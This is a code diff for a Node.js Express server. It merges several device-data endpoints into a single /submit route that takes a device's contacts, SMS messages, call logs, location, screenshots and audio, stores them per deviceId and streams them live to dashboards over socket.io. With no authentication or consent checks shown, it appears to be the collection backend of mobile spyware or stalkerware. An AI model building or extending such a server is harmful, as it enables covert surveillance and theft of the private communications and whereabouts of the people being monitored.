@@ -61,101 +61,40 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage: storage });
 
-// POST: Location
-app.post('/api/location', (req, res) => {
-  const { deviceId, ...rest } = req.body;
+// Replace all individual POST endpoints with a single /submit endpoint
+app.post('/submit', (req, res) => {
+  const { deviceId, info, contacts, sms, calllog, location, screenshots, audio } = req.body;
   if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
   ensureDevice(deviceId);
-  const data = { ...rest, timestamp: new Date().toISOString() };
-  devices[deviceId].locations.push(data);
-  emitUpdate(deviceId, 'location', data);
-  res.status(200).json({ message: 'Location received', data });
-});
-
-// POST: Contacts
-app.post('/api/contacts', (req, res) => {
-  const { deviceId, ...rest } = req.body;
-  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
-  ensureDevice(deviceId);
-  const data = { ...rest, timestamp: new Date().toISOString() };
-  devices[deviceId].contacts.push(data);
-  emitUpdate(deviceId, 'contacts', data);
-  res.status(200).json({ message: 'Contacts received', data });
-});
-
-// POST: SMS
-app.post('/api/sms', (req, res) => {
-  const { deviceId, ...rest } = req.body;
-  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
-  ensureDevice(deviceId);
-  const data = { ...rest, timestamp: new Date().toISOString() };
-  devices[deviceId].sms.push(data);
-  emitUpdate(deviceId, 'sms', data);
-  res.status(200).json({ message: 'SMS received', data });
-});
-
-// POST: Call Logs
-app.post('/api/calllog', (req, res) => {
-  const { deviceId, ...rest } = req.body;
-  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
-  ensureDevice(deviceId);
-  const data = { ...rest, timestamp: new Date().toISOString() };
-  devices[deviceId].calllogs.push(data);
-  emitUpdate(deviceId, 'calllog', data);
-  res.status(200).json({ message: 'Call log received', data });
-});
-
-// POST: Screenshot (base64 image string)
-app.post('/api/screenshot', (req, res) => {
-  const { deviceId, ...rest } = req.body;
-  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
-  ensureDevice(deviceId);
-  const data = { ...rest, timestamp: new Date().toISOString() };
-  devices[deviceId].screenshots.push(data);
-  emitUpdate(deviceId, 'screenshot', data);
-  res.status(200).json({ message: 'Screenshot received', data });
-});
-
-// POST: Multi-type data
-app.post('/api/data', (req, res) => {
-  const { deviceId, location, contacts: cts, sms: smsArr, calllog, screenshot, ...rest } = req.body;
-  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
-  ensureDevice(deviceId);
-  let responses = [];
-  if (location) {
-    const data = { ...location, ...rest, timestamp: new Date().toISOString() };
-    devices[deviceId].locations.push(data);
-    emitUpdate(deviceId, 'location', data);
-    responses.push({ type: 'location', data });
+  if (info) {
+    devices[deviceId].info = { ...devices[deviceId].info, ...info, timestamp: new Date().toISOString() };
+    io.emit('deviceinfo-update', { deviceId, info: devices[deviceId].info });
   }
-  if (cts) {
-    const data = { ...cts, ...rest, timestamp: new Date().toISOString() };
-    devices[deviceId].contacts.push(data);
-    emitUpdate(deviceId, 'contacts', data);
-    responses.push({ type: 'contacts', data });
+  if (contacts) {
+    devices[deviceId].contacts.push(...contacts);
+    io.emit('new-contacts', { deviceId, data: contacts });
   }
-  if (smsArr) {
-    const data = { ...smsArr, ...rest, timestamp: new Date().toISOString() };
-    devices[deviceId].sms.push(data);
-    emitUpdate(deviceId, 'sms', data);
-    responses.push({ type: 'sms', data });
+  if (sms) {
+    devices[deviceId].sms.push(...sms);
+    io.emit('new-sms', { deviceId, data: sms });
   }
   if (calllog) {
-    const data = { ...calllog, ...rest, timestamp: new Date().toISOString() };
-    devices[deviceId].calllogs.push(data);
-    emitUpdate(deviceId, 'calllog', data);
-    responses.push({ type: 'calllog', data });
+    devices[deviceId].calllogs.push(...calllog);
+    io.emit('new-calllog', { deviceId, data: calllog });
   }
-  if (screenshot) {
-    const data = { ...screenshot, ...rest, timestamp: new Date().toISOString() };
-    devices[deviceId].screenshots.push(data);
-    emitUpdate(deviceId, 'screenshot', data);
-    responses.push({ type: 'screenshot', data });
+  if (location) {
+    devices[deviceId].locations.push(location);
+    io.emit('new-location', { deviceId, data: location });
   }
-  if (!responses.length) {
-    return res.status(400).json({ error: 'No valid data types provided' });
+  if (screenshots) {
+    devices[deviceId].screenshots.push(...screenshots);
+    io.emit('new-screenshot', { deviceId, data: screenshots });
   }
-  res.status(200).json({ message: 'Data received', responses });
+  if (audio) {
+    devices[deviceId].audio.push(...audio);
+    io.emit('new-audio', { deviceId, data: audio });
+  }
+  res.status(200).json({ message: 'Data received' });
 });
 
 // POST: Audio upload
